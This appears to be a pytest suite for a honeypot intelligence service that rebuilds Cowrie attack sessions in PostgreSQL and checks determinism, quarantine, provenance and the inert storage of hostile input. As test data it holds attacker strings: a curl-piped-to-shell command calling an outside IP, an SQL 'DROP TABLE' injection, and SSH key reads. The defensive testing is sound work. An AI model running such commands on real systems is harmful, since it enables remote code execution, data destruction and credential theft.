"""P4 promotion and reconstruction on real PostgreSQL (FR-005, FR-005b, FR-006, FR-048).

Covers the approved engineering decisions (ARCHITECTURE.md ADR-024):
D1 order, D2 close-only trigger, D3 late events, D4 one behavior per phase,
D5 deterministic identifiers, D6 connect-owned network fields, D7 text
mapping; plus provenance, idempotency, atomicity, bounds, hostile input and
the mandatory fresh-database determinism check.
"""

from __future__ import annotations

import json
import logging
from pathlib import Path
from typing import Any

import psycopg
import pytest

from aitl_common.logging import JsonFormatter
from intel_service import identity
from intel_service.promotion import (
    INVALID_PAYLOAD,
    LATE_EVENT,
    SESSION_TOO_LARGE,
    Promoter,
    PromotionBoundError,
    PromotionLimits,
)
from intel_service.sessions import CONFLICTING_FIELD, NO_CONNECT_EVENT
from tests.fixtures import honeypot_corpus
from tests.fixtures.cowrie_events import cowrie_line, load_phase_rules
from tests.fixtures.staging import (
    ingest_corpus,
    projection,
    promoter,
    role_engine,
    stage,
    stage_with_ids,
)
from tests.pg_harness import Cluster

S1 = "a1b2c3d4e5f60001"
S2 = "a1b2c3d4e5f60002"
EXPECTED_CORPUS_PHASES = {
    "0ba5e000e0f00001": ["scanning", "credential_probing", "unclassified"],
    "a1b0c0d0e0f00001": [
        "scanning",
        "credential_probing",
        "credential_file_access",
        "unclassified",
    ],
    "a2b0c0d0e0f00001": [
        "scanning",
        "credential_probing",
        "discovery",
        "credential_file_access",
        "exfiltration_attempt",
        "unclassified",
    ],
    "a3b0c0d0e0f00001": [
        "scanning",
        "credential_probing",
        "discovery",
        "collection",
        "exfiltration_attempt",
        "ingress_transfer",
        "unclassified",
    ],
    "b0f0c0d0e0f00001": ["scanning", "credential_probing", "unclassified"],
    "b0f0c0d0e0f00002": ["scanning", "credential_probing", "unclassified"],
    # "cd /tmp && wget ..." starts with `cd`: P4 does not shell-parse compound commands.
    "ba1d0000e0f00001": [
        "scanning",
        "credential_probing",
        "unclassified",
        "ingress_transfer",
        "execution",
    ],
    "d15c0000e0f00001": ["scanning", "credential_probing", "discovery", "unclassified"],
}


def ts(second: int) -> str:
    return f"2025-03-01T10:00:{second:02d}.000000Z"


def session_lines(session: str = S1, *, close: bool = True, **connect: Any) -> list[bytes]:
    lines = [
        cowrie_line("cowrie.session.connect", session=session, timestamp=ts(0), **connect),
        cowrie_line("cowrie.login.success", session=session, timestamp=ts(1)),
        cowrie_line("cowrie.command.input", session=session, timestamp=ts(2), input="uname -a"),
    ]
    if close:
        lines.append(cowrie_line("cowrie.session.closed", session=session, timestamp=ts(3)))
    return lines


@pytest.fixture
def db(pg: Cluster, fresh_db: str) -> str:
    pg.upgrade(fresh_db)
    return fresh_db


@pytest.fixture
def corpus_db(pg: Cluster, db: str, tmp_path: Path) -> str:
    ingest_corpus(pg, db, tmp_path)
    return db


def rows(pg: Cluster, dbname: str, sql: str, params: tuple[Any, ...] = ()) -> list[tuple[Any, ...]]:
    with pg.admin(dbname) as conn:
        return [tuple(r) for r in conn.execute(sql, params).fetchall()]


# --- corpus ---------------------------------------------------------------------------------------


def test_corpus_reconstruction(pg: Cluster, corpus_db: str) -> None:
    result = promoter(pg, corpus_db).run()
    assert (result.sessions_promoted, result.pending_sessions, result.failed_sessions) == (8, 1, 0)
    assert not result.quarantined
    phases: dict[str, list[str]] = {}
    for session, phase in rows(
        pg,
        corpus_db,
        "SELECT s.cowrie_session_id, b.phase::text FROM intel.attacker_behavior b "
        "JOIN intel.attack_session s ON s.id = b.session_id "
        "ORDER BY s.cowrie_session_id, b.ordinal",
    ):
        phases.setdefault(session, []).append(phase)
    assert phases == EXPECTED_CORPUS_PHASES


def test_every_closed_session_event_is_promoted_and_linked(pg: Cluster, corpus_db: str) -> None:
    """FR-006 no event loss: each promoted event is linked to at least one behavior."""
    promoter(pg, corpus_db).run()
    unlinked = rows(
        pg,
        corpus_db,
        "SELECT e.id FROM intel.attack_event e WHERE NOT EXISTS "
        "(SELECT 1 FROM intel.behavior_event l WHERE l.event_id = e.id)",
    )
    assert unlinked == []
    per_session = dict(
        rows(
            pg,
            corpus_db,
            "SELECT s.cowrie_session_id, count(*) FROM intel.attack_event e "
            "JOIN intel.attack_session s ON s.id = e.session_id GROUP BY 1",
        )
    )
    assert per_session["a2b0c0d0e0f00001"] == len(honeypot_corpus._ar2_key_theft())
    assert per_session["b0f0c0d0e0f00001"] == len(honeypot_corpus._brute_force_only()) // 2


def test_corpus_sessions_are_synthetic_and_live_ones_honeypot(
    pg: Cluster, db: str, tmp_path: Path
) -> None:
    logs = tmp_path / "live"
    logs.mkdir()
    (logs / "cowrie.json").write_bytes(honeypot_corpus.render()["ar1_cloud_credentials.json"])
    ingest_corpus(pg, db, tmp_path, source=logs, mode="live")
    ingest_corpus(pg, db, tmp_path)  # the same session ID, as fixture data
    promoter(pg, db).run()
    labels = rows(
        pg,
        db,
        "SELECT source_type::text, count(*) FROM intel.attack_session GROUP BY 1 ORDER BY 1",
    )
    assert labels == [("honeypot", 1), ("synthetic", 8)]


# --- mandatory determinism ------------------------------------------------------------------------


def test_fresh_databases_reconstruct_identically_including_ids(
    pg: Cluster, db: str, tmp_path: Path
) -> None:
    """Mandatory determinism check on the real corpus through the real P3 path.

    Case A: the shipper stages the corpus deterministically (files by name,
    lines in order), so both fresh databases hold the same raw_record_ids;
    the reconstruction, identifiers included, is then identical.
    """
    ingest_corpus(pg, db, tmp_path)
    promoter(pg, db).run()
    first = projection(pg, db)
    for table in ("sessions", "events", "behaviors", "links"):
        assert first[table], table
    other = f"{db}_b"
    pg.create_database(other)
    try:
        pg.upgrade(other)
        ingest_corpus(pg, other, tmp_path)
        promoter(pg, other).run()
        assert projection(pg, other) == first
    finally:
        pg.drop_database(other)
    # The identifiers are the D5 derivations, not database-generated values.
    for session_uuid, source_type, cowrie_session_id, *_ in first["sessions"]:
        assert session_uuid == str(identity.session_id(source_type, cowrie_session_id))


def test_file_creation_order_does_not_matter(pg: Cluster, db: str, tmp_path: Path) -> None:
    """Filesystem creation order never reaches P4: the P3 reader stages files by name,
    so the raw_record_ids - and hence the reconstruction - are identical (case A)."""
    forward = tmp_path / "forward"
    reverse = tmp_path / "reverse"
    forward.mkdir()
    reverse.mkdir()
    rendered = honeypot_corpus.render()
    for name in sorted(rendered):
        (forward / name).write_bytes(rendered[name])
    for name in sorted(rendered, reverse=True):
        (reverse / name).write_bytes(rendered[name])
    ingest_corpus(pg, db, tmp_path, source=forward)
    promoter(pg, db).run()
    other = f"{db}_r"
    pg.create_database(other)
    try:
        pg.upgrade(other)
        ingest_corpus(pg, other, tmp_path, source=reverse)
        promoter(pg, other).run()
        assert projection(pg, other) == projection(pg, db)
    finally:
        pg.drop_database(other)


# --- D1 ordering ----------------------------------------------------------------------------------


def test_identical_timestamps_order_by_raw_record_id_not_physical_order(
    pg: Cluster, db: str
) -> None:
    same = ts(5)
    lines = {
        10: cowrie_line("cowrie.session.connect", session=S1, timestamp=ts(0)),
        30: cowrie_line("cowrie.command.input", session=S1, timestamp=same, input="zzz"),
        20: cowrie_line("cowrie.command.input", session=S1, timestamp=same, input="aaa"),
        40: cowrie_line("cowrie.session.closed", session=S1, timestamp=ts(9)),
    }
    stage_with_ids(pg, db, [(i, lines[i]) for i in (40, 30, 10, 20)])  # scrambled physically
    promoter(pg, db).run()
    assert rows(pg, db, "SELECT raw_record_id, seq FROM intel.attack_event ORDER BY seq") == [
        (10, 1),
        (20, 2),
        (30, 3),
        (40, 4),
    ]


def _mixed_dataset() -> list[tuple[int, bytes]]:
    """(raw_record_id, line) pairs exercising every P4 outcome, with timestamp ties."""
    tie = ts(5)
    s3, s4, s5 = "a1b2c3d4e5f60003", "a1b2c3d4e5f60004", "a1b2c3d4e5f60005"
    return [
        # S1: tied commands (D1), one multi-phase event (D4), promoted.
        (1, cowrie_line("cowrie.session.connect", session=S1, timestamp=ts(0))),
        (2, cowrie_line("cowrie.command.input", session=S1, timestamp=tie, input="uname -a")),
        (3, cowrie_line("cowrie.command.input", session=S1, timestamp=tie, input="curl -T a b")),
        (4, cowrie_line("cowrie.command.input", session=S1, timestamp=tie, input="tar c x")),
        (5, cowrie_line("cowrie.session.closed", session=S1, timestamp=ts(9))),
        # S2: its connect ties with its first command, promoted.
        (6, cowrie_line("cowrie.session.connect", session=S2, timestamp=tie)),
        (7, cowrie_line("cowrie.login.failed", session=S2, timestamp=tie)),
        (8, cowrie_line("cowrie.session.closed", session=S2, timestamp=ts(9))),
        # S3: no connect event -> quarantined whole (D6).
        (9, cowrie_line("cowrie.command.input", session=s3, timestamp=tie)),
        (10, cowrie_line("cowrie.session.closed", session=s3, timestamp=ts(9))),
        # S4: conflicting src_ip -> quarantined whole (D6).
        (11, cowrie_line("cowrie.session.connect", session=s4, timestamp=ts(0))),
        (12, cowrie_line("cowrie.command.input", session=s4, timestamp=tie, src_ip="198.51.100.5")),
        (13, cowrie_line("cowrie.session.closed", session=s4, timestamp=ts(9))),
        # S5: open -> pending (D2).
        (14, cowrie_line("cowrie.session.connect", session=s5, timestamp=ts(0))),
        # A staged row that fails re-validation -> promotion.invalid_payload.
        (15, b'{"eventid": "cowrie.command.input", "x": 1}'),
    ]


def test_fixed_staging_dataset_reconstructs_identically_in_any_physical_order(
    pg: Cluster, db: str
) -> None:
    """THE P4 DETERMINISM GUARANTEE (ADR-024), case A.

    The same immutable staging rows - same raw_record_id, same payload, same
    occurred_at - inserted in different physical orders into two fresh
    databases produce identical reconstructions: seq values, session, event and
    behavior IDs, links, normalized fields, provenance anchors and quarantine
    outcomes. (raw_record_id is part of the fixed dataset; see
    test_different_raw_record_ids_can_legitimately_reorder_tied_events for
    what happens when it is not.)
    """
    dataset = _mixed_dataset()
    stage_with_ids(pg, db, dataset)
    first_run = promoter(pg, db).run()
    first = projection(pg, db)
    # The dataset really exercises ties, multi-phase links, quarantine and pending.
    assert (first_run.sessions_promoted, first_run.pending_sessions) == (2, 1)
    assert first_run.quarantined == {
        NO_CONNECT_EVENT: 2,
        CONFLICTING_FIELD: 3,
        INVALID_PAYLOAD: 1,
    }
    assert len(first["links"]) > len(first["events"])
    other = f"{db}_p"
    pg.create_database(other)
    try:
        pg.upgrade(other)
        stage_with_ids(pg, other, list(reversed(dataset)))  # different physical order
        second_run = promoter(pg, other).run()
        assert second_run == first_run
        assert projection(pg, other) == first
    finally:
        pg.drop_database(other)


def test_different_raw_record_ids_can_legitimately_reorder_tied_events(
    pg: Cluster, db: str
) -> None:
    """Case B - documented behavior, NOT a determinism violation.

    D1 orders tied timestamps by raw_record_id, the staging identity assigned
    when a row is first staged. If the same logical events are staged in a
    different arrival order, they receive different raw_record_ids, and tied
    events legitimately take different seq values - and therefore different
    D5 event IDs (event identity is (session, seq)). Untied events, the
    session identity and the set of phases are unaffected.
    """
    tie = ts(5)
    connect = cowrie_line("cowrie.session.connect", session=S1, timestamp=ts(0))
    first_cmd = cowrie_line("cowrie.command.input", session=S1, timestamp=tie, input="uname -a")
    second_cmd = cowrie_line("cowrie.command.input", session=S1, timestamp=tie, input="tar c x")
    close = cowrie_line("cowrie.session.closed", session=S1, timestamp=ts(9))
    stage(pg, db, [connect, first_cmd, second_cmd, close])
    promoter(pg, db).run()
    other = f"{db}_b"
    pg.create_database(other)
    try:
        pg.upgrade(other)
        stage(pg, other, [connect, second_cmd, first_cmd, close])  # tied pair arrives swapped
        promoter(pg, other).run()
        sql = "SELECT seq, id::text, normalized_text FROM intel.attack_event ORDER BY seq"
        a, b = rows(pg, db, sql), rows(pg, other, sql)
        # Same positions and therefore the same event IDs per seq ...
        assert [(r[0], r[1]) for r in a] == [(r[0], r[1]) for r in b]
        # ... but the tied pair's content follows each database's raw_record_id order.
        assert [r[2] for r in a] == ["", "uname -a", "tar c x", ""]
        assert [r[2] for r in b] == ["", "tar c x", "uname -a", ""]
        # Session identity and behavior membership by phase are unchanged.
        phases = (
            "SELECT s.id::text, b.phase::text FROM intel.attacker_behavior b "
            "JOIN intel.attack_session s ON s.id = b.session_id ORDER BY b.phase"
        )
        assert rows(pg, db, phases) == rows(pg, other, phases)
    finally:
        pg.drop_database(other)


def test_out_of_order_ingestion_is_ordered_by_time(pg: Cluster, db: str) -> None:
    lines = session_lines()
    stage(pg, db, [lines[3], lines[2], lines[0], lines[1]])  # close ingested first
    promoter(pg, db).run()
    assert [
        r[0] for r in rows(pg, db, "SELECT event_type::text FROM intel.attack_event ORDER BY seq")
    ] == ["session_connect", "login_success", "command_input", "session_closed"]


# --- D2 completion --------------------------------------------------------------------------------


def test_open_session_stays_pending_and_closing_promotes_it(pg: Cluster, db: str) -> None:
    stage(pg, db, session_lines(close=False))
    first = promoter(pg, db).run()
    assert (first.sessions_promoted, first.pending_sessions, first.pending_events) == (0, 1, 3)
    assert rows(pg, db, "SELECT count(*) FROM intel.attack_session") == [(0,)]
    stage(pg, db, [cowrie_line("cowrie.session.closed", session=S1, timestamp=ts(3))])
    second = promoter(pg, db).run()
    assert (second.sessions_promoted, second.events_promoted, second.pending_sessions) == (1, 4, 0)


def test_repeated_promotion_is_idempotent(pg: Cluster, corpus_db: str) -> None:
    promoter(pg, corpus_db).run()
    before = projection(pg, corpus_db)
    again = promoter(pg, corpus_db).run()
    assert (again.sessions_promoted, again.events_promoted) == (0, 0)
    assert projection(pg, corpus_db) == before


# --- D3 late events -------------------------------------------------------------------------------


def test_late_event_is_quarantined_and_history_is_unchanged(pg: Cluster, db: str) -> None:
    stage(pg, db, session_lines())
    promoter(pg, db).run()
    before = projection(pg, db)
    late = cowrie_line("cowrie.command.input", session=S1, timestamp=ts(1), input="cat ~/.ssh/k")
    (late_id,) = stage(pg, db, [late])[-1:]
    result = promoter(pg, db).run()
    assert result.quarantined == {LATE_EVENT: 1}
    after = projection(pg, db)
    for table in ("sessions", "events", "behaviors", "links"):
        assert after[table] == before[table], table
    assert [(q[1], q[2]) for q in after["quarantine"]] == [(LATE_EVENT, late_id)]


# --- D6 session fields ----------------------------------------------------------------------------


def test_connect_event_owns_the_network_fields(pg: Cluster, db: str) -> None:
    ids = stage(pg, db, session_lines(src_port=51022))
    promoter(pg, db).run()
    session = rows(
        pg,
        db,
        "SELECT host(src_ip), src_port, first_event_at, first_raw_record_id "
        "FROM intel.attack_session",
    )
    assert session[0][:2] == ("203.0.113.7", 51022)
    assert session[0][3] == ids[0]


@pytest.mark.parametrize(
    ("mutate", "reason"),
    [
        (lambda ls: ls[1:], NO_CONNECT_EVENT),
        (
            lambda ls: [
                *ls,
                cowrie_line("cowrie.session.connect", session=S1, timestamp=ts(4), src_port=9),
            ],
            CONFLICTING_FIELD,
        ),
        (
            lambda ls: [
                *ls,
                cowrie_line(
                    "cowrie.command.input", session=S1, timestamp=ts(2), src_ip="198.51.100.5"
                ),
            ],
            CONFLICTING_FIELD,
        ),
    ],
    ids=["missing-connect", "second-connect", "conflicting-src-ip"],
)
def test_invalid_sessions_are_quarantined_whole(
    pg: Cluster, db: str, mutate: Any, reason: str
) -> None:
    ids = stage(pg, db, mutate(session_lines()))
    result = promoter(pg, db).run()
    assert result.quarantined == {reason: len(ids)}
    assert rows(pg, db, "SELECT count(*) FROM intel.attack_session") == [(0,)]
    assert rows(
        pg,
        db,
        "SELECT raw_record_id FROM intel_raw.quarantine_record WHERE stage = 'promotion' "
        "ORDER BY raw_record_id",
    ) == [(i,) for i in ids]
    # Evidence is preserved, never rewritten or dropped.
    assert rows(pg, db, "SELECT count(*) FROM intel_raw.raw_ingest_record") == [(len(ids),)]


# --- quarantine, bounds, atomicity ----------------------------------------------------------------


def test_payload_that_fails_revalidation_is_quarantined(pg: Cluster, db: str) -> None:
    """Staging is untrusted even after P3: re-validation runs again (Principle 19)."""
    (bad,) = stage(pg, db, [b'{"eventid": "cowrie.command.input", "x": 1}'])
    result = promoter(pg, db).run()
    assert result.quarantined == {INVALID_PAYLOAD: 1}
    ((payload,),) = rows(
        pg, db, "SELECT payload FROM intel_raw.quarantine_record WHERE raw_record_id = %s", (bad,)
    )
    assert json.loads(payload) == {
        "detail": "event.invalid_session",
        "raw_record_id": bad,
        "reason": INVALID_PAYLOAD,
    }


# Operational safety bounds (ADR-024): they protect the service, they are not a
# judgement about attacker behavior, and they never promote part of a session.


@pytest.mark.parametrize(("limit", "promoted"), [(4, True), (3, False)])
def test_session_event_bound_at_and_over_the_limit(
    pg: Cluster, db: str, limit: int, promoted: bool
) -> None:
    ids = stage(pg, db, session_lines())  # 4 events
    result = promoter(pg, db, PromotionLimits(max_session_events=limit)).run()
    events = rows(pg, db, "SELECT count(*) FROM intel.attack_event")
    if promoted:
        assert (result.sessions_promoted, events, result.quarantined) == (1, [(4,)], {})
    else:  # the whole session is quarantined, auditable per event; nothing is promoted
        assert (result.sessions_promoted, events) == (0, [(0,)])
        assert result.quarantined == {SESSION_TOO_LARGE: 4}
        assert rows(
            pg,
            db,
            "SELECT raw_record_id FROM intel_raw.quarantine_record "
            "WHERE reason_code = 'promotion.session_too_large' ORDER BY raw_record_id",
        ) == [(i,) for i in ids]


def test_backlog_bound_at_the_limit_promotes(pg: Cluster, db: str) -> None:
    stage(pg, db, session_lines() + session_lines(S2))  # 8 unhandled events
    result = promoter(pg, db, PromotionLimits(max_unhandled_events=8, page_size=3)).run()
    assert result.sessions_promoted == 2


def test_backlog_bound_over_the_limit_fails_closed_before_any_write(pg: Cluster, db: str) -> None:
    # Includes a row that would be quarantined: not even quarantine is written.
    stage(pg, db, [*session_lines(), *session_lines(S2), b'{"eventid": "x"}'])
    with pytest.raises(PromotionBoundError):
        promoter(pg, db, PromotionLimits(max_unhandled_events=8, page_size=3)).run()
    assert projection(pg, db) == {
        "sessions": [],
        "events": [],
        "behaviors": [],
        "links": [],
        "quarantine": [],
    }


def test_a_failed_session_leaves_no_partial_rows_and_retries(
    pg: Cluster, db: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    stage(pg, db, session_lines())
    original = Promoter._write

    def fail_after_events(connection: Any, plan: Any) -> None:
        original(connection, plan)
        raise RuntimeError("process interrupted")

    monkeypatch.setattr(Promoter, "_write", staticmethod(fail_after_events))
    assert promoter(pg, db).run().failed_sessions == 1
    assert rows(pg, db, "SELECT count(*) FROM intel.attack_event") == [(0,)]
    assert rows(pg, db, "SELECT count(*) FROM intel.attack_session") == [(0,)]
    monkeypatch.setattr(Promoter, "_write", staticmethod(original))
    assert promoter(pg, db).run().sessions_promoted == 1


# --- provenance -----------------------------------------------------------------------------------


def test_provenance_both_directions(pg: Cluster, corpus_db: str) -> None:
    promoter(pg, corpus_db).run()
    chain = rows(
        pg,
        corpus_db,
        "SELECT b.phase::text, e.seq, s.cowrie_session_id, s.source_type::text, r.id, "
        "r.ingest_mode::text "
        "FROM intel.attacker_behavior b "
        "JOIN intel.behavior_event l ON l.behavior_id = b.id "
        "JOIN intel.attack_event e ON e.id = l.event_id AND e.session_id = b.session_id "
        "JOIN intel.attack_session s ON s.id = e.session_id "
        "JOIN intel_raw.raw_ingest_record r ON r.id = e.raw_record_id "
        "WHERE b.phase = 'exfiltration_attempt' ORDER BY s.cowrie_session_id",
    )
    assert [(c[0], c[2], c[3], c[5]) for c in chain] == [
        ("exfiltration_attempt", "a2b0c0d0e0f00001", "synthetic", "fixture"),
        ("exfiltration_attempt", "a3b0c0d0e0f00001", "synthetic", "fixture"),
    ]
    # Reverse: raw record -> event -> behaviors.
    raw_id = chain[0][4]
    back = rows(
        pg,
        corpus_db,
        "SELECT b.phase::text FROM intel.attack_event e "
        "JOIN intel.behavior_event l ON l.event_id = e.id "
        "JOIN intel.attacker_behavior b ON b.id = l.behavior_id WHERE e.raw_record_id = %s",
        (raw_id,),
    )
    assert back == [("exfiltration_attempt",)]


ORPHAN_CASES = {
    # (statement, constraint that must reject it) - each case has exactly one missing link.
    "link-without-event": (
        "INSERT INTO intel.behavior_event (behavior_id, event_id, session_id) "
        "VALUES (%(behavior)s, gen_random_uuid(), %(session)s)",
        "fk_behavior_event_event",
    ),
    "link-without-behavior": (
        "INSERT INTO intel.behavior_event (behavior_id, event_id, session_id) "
        "VALUES (gen_random_uuid(), %(event)s, %(session)s)",
        "fk_behavior_event_behavior",
    ),
    "link-across-sessions": (
        "INSERT INTO intel.behavior_event (behavior_id, event_id, session_id) "
        "VALUES (%(behavior)s, %(other_event)s, %(session)s)",
        "fk_behavior_event_event",
    ),
    "behavior-without-session": (
        "INSERT INTO intel.attacker_behavior (session_id, ordinal, phase, phase_rules_version, "
        "started_at, ended_at) VALUES (gen_random_uuid(), 1, 'discovery', 'phase-rules-v1', "
        "now(), now())",
        "fk_attacker_behavior_session",
    ),
    "event-without-session": (
        "INSERT INTO intel.attack_event (session_id, raw_record_id, seq, event_type, occurred_at, "
        "raw_text, normalized_text, truncated) VALUES (gen_random_uuid(), %(free_raw)s, 1, "
        "'other', now(), '', '', false)",
        "fk_attack_event_session",
    ),
    "event-without-raw-record": (
        "INSERT INTO intel.attack_event (session_id, raw_record_id, seq, event_type, occurred_at, "
        "raw_text, normalized_text, truncated) VALUES (%(session)s, 999999999, 999, "
        "'other', now(), '', '', false)",
        "fk_attack_event_raw_record",
    ),
}


@pytest.mark.parametrize("case", sorted(ORPHAN_CASES))
def test_each_provenance_link_is_enforced_by_its_foreign_key(
    pg: Cluster, corpus_db: str, case: str
) -> None:
    """A behavior, link or event without its source cannot exist; each FK is checked alone."""
    promoter(pg, corpus_db).run()
    ((behavior, session),) = rows(
        pg, corpus_db, "SELECT id, session_id FROM intel.attacker_behavior ORDER BY id LIMIT 1"
    )
    ((event,),) = rows(
        pg, corpus_db, "SELECT id FROM intel.attack_event WHERE session_id = %s LIMIT 1", (session,)
    )
    ((other_event,),) = rows(
        pg,
        corpus_db,
        "SELECT id FROM intel.attack_event WHERE session_id <> %s LIMIT 1",
        (session,),
    )
    ((free_raw,),) = rows(
        pg,
        corpus_db,
        "SELECT min(r.id) FROM intel_raw.raw_ingest_record r WHERE r.kind = 'event' AND NOT EXISTS "
        "(SELECT 1 FROM intel.attack_event e WHERE e.raw_record_id = r.id)",
    )
    statement, constraint = ORPHAN_CASES[case]
    params = {
        "behavior": behavior,
        "session": session,
        "event": event,
        "other_event": other_event,
        "free_raw": free_raw,
    }
    with (
        pg.connect(corpus_db, "intel_svc") as conn,
        pytest.raises(psycopg.errors.ForeignKeyViolation) as raised,
    ):
        conn.execute(statement, params)
    assert raised.value.diag.constraint_name == constraint


@pytest.mark.parametrize(
    "statement",
    [
        "UPDATE intel.attack_event SET seq = seq + 100",
        "DELETE FROM intel.attacker_behavior",
        "UPDATE intel.attack_session SET source_type = 'honeypot'",
        "DELETE FROM intel.behavior_event",
    ],
)
def test_reconstruction_is_append_only_for_its_writer(
    pg: Cluster, corpus_db: str, statement: str
) -> None:
    promoter(pg, corpus_db).run()
    with (
        pg.connect(corpus_db, "intel_svc") as conn,
        pytest.raises(psycopg.errors.InsufficientPrivilege),
    ):
        conn.execute(statement)


def test_promotion_refuses_any_role_but_intel_svc(pg: Cluster, db: str) -> None:
    engine = role_engine(pg, db, "ingest_writer")
    try:
        with pytest.raises(PermissionError):
            Promoter(engine, load_phase_rules())
    finally:
        engine.dispose()


# --- hostile input and logging --------------------------------------------------------------------


def test_hostile_session_is_stored_inert(pg: Cluster, corpus_db: str) -> None:
    promoter(pg, corpus_db).run()
    texts = [
        r[0]
        for r in rows(
            pg,
            corpus_db,
            "SELECT e.raw_text FROM intel.attack_event e JOIN intel.attack_session s "
            "ON s.id = e.session_id WHERE s.cowrie_session_id = '0ba5e000e0f00001' "
            "AND e.event_type = 'command_input' ORDER BY e.seq",
        )
    ]
    assert "'; DROP TABLE intel_raw.raw_ingest_record; --" in texts
    assert "$(curl -s http://198.51.100.9/p | sh)" in texts
    assert rows(pg, corpus_db, "SELECT count(*) > 0 FROM intel_raw.raw_ingest_record") == [(True,)]
    nul = [t for t in texts if t.endswith("nul-escaped")]
    assert nul == ["\ufffdnul-escaped"]  # U+0000 is not storable: replaced, and flagged as evidence
    escaped = rows(
        pg,
        corpus_db,
        "SELECT e.raw_text, e.normalized_text FROM intel.attack_event e "
        "WHERE e.raw_text LIKE '%%' || chr(27) || '%%'",
    )
    assert escaped == [("\x1b[2J\x1b[31mred\x1b[0m", "red")]  # ANSI escapes removed


def test_logs_carry_counts_and_correlation_only(
    pg: Cluster, corpus_db: str, caplog: pytest.LogCaptureFixture
) -> None:
    with caplog.at_level(logging.DEBUG, logger="intel_service"):
        promoter(pg, corpus_db).run()
    documents = [json.loads(JsonFormatter().format(r)) for r in caplog.records]
    runs = [d for d in documents if d.get("event") == "promotion.run"]
    assert len(runs) == 1
    assert runs[0]["correlation_id"]
    assert runs[0]["fields"]["sessions_promoted"] == 8
    rendered = json.dumps(documents)
    for forbidden in ("toor", "id_rsa", "DROP TABLE", "203.0.113", "a2b0c0d0e0f00001", "uname"):
        assert forbidden not in rendered, forbidden


def test_phase_tie_break_order_is_the_database_enum(pg: Cluster, db: str) -> None:
    from intel_service.reconstruction import PHASE_ORDER

    ((labels,),) = rows(pg, db, "SELECT enum_range(NULL::public.behavior_phase)::text[]")
    assert tuple(labels) == PHASE_ORDER
